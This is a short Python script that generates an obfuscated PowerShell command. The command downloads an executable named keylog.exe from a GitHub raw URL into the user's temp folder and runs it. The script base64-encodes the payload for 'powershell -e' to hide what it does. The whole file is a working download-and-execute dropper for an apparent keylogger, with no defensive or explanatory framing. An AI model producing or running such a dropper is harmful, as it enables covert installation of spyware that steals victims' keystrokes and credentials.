import sys
import base64


payload = 'Invoke-WebRequest -Uri "https://github.com/mussssssssss/kl/raw/refs/heads/main/keylog.exe" -OutFile "$env:TEMP\keylog.exe"; Start-Process -FilePath "$env:TEMP\keylog.exe" -NoNewWindow -Wait'


cmdline = "powershell -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()

print(cmdline)
